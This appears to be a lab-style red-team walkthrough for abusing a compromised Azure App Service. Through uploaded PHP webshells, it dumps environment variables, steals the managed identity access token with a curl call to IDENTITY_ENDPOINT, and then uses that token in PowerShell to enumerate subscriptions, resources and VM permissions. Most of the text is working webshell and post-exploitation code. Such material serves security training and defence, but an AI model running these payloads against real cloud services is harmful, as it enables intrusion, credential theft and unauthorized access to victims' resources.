# Initial Access - File Upload
## Initial Access via Compromised App Service Abuse with File Upload 
***Part of - Kill Chain - 1***

If you exploited an Azure App Service with file upload or RCE when you executed as `env` command on the app you can find variables to detect that the app server runs via managed identity. The variables are listed below;
  - `IDENTITY_HEADER`
  - `IDENTITY_ENDPOINT`

<!---objective 10 -->
1. If the app service uses a Managed Identity, we may have the ability to have interesting permissions on other Azure resources.
2. After compromising an app service, we can request access tokens for the managed identity.
3. If the app service contains environment variables `IDENTITY_HEADER` and `IDENTITY_ENDPOINT`, it has a managed identity.
    ```
    http://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env 
    ```

  ![test](/img/app_server_abuse.png "Initial Access via App Service Abuse")



4. Get the access token for the managed identity using another webshell. Upload `studentxtoken.PHTML`
    ```php
    <?php 
    system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
    ?>
    ```
    After upload `studentxtoken.PHTML` go to the URL as `https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml` for get app svc token.

    ![test](/img/app_server_abuse_1.png "Initial Access via App Service Abuse")







5. Check the resources available to the managed identity (using the access token and client ID)
    ```powershell
    Connect-AzAccount -AccessToken $token -AccountId $account_id
    Get-AzResource
    ```
    We can use the access token and client ID from above with Az PowerShell. But Az PowerShell needs tokens for both the azure resource manager (arn) and aad graph. With only the arm token, we will get the below error after running Get-AzRoleAssignment
    ![test](/img/app_server_abuse_2.png "Initial Access via App Service Abuse")



6. Check the permissions of the managed identity on the virtual machine from above
  ![test](/img/app_server_abuse_3.png "Initial Access via App Service Abuse")

    ```powershell
    $URI = 'https://management.azure.com/subscriptions?apiversion=2020-01-01'
    $RequestParams = @{
      Method = 'GET'
      Uri = $URI
      Headers = @{
        'Authorization' = 'Bearer $token'
      }
    }

    #After successfully execution please execute the command down below 
    (Invoke-RestMethod @RequestParams).value
    ```
  ![test](/img/app_server_abuse_4.png "Initial Access via App Service Abuse")
  
    ```powershell
    $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'
    $RequestParams = @{
      Method = 'GET'
      Uri = $URI
      Headers = @{
        'Authorization' = 'Bearer $token'
      }
    }

    #After successfully execution please execute the command down below 
    (Invoke-RestMethod @RequestParams).value
    ```
    
  Let's see what actions are allowed using the below code:
    
  ![test](/img/app_server_abuse_4.png "Initial Access via App Service Abuse")
    
    ```powershell
    $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
    $RequestParams = @{
      Method = 'GET'
      Uri = $URI
      Headers = @{
        'Authorization' = 'Bearer $token'
      }
    }

    #After successfully execution please execute the command down below 
    (Invoke-RestMethod @RequestParams).value
    ```


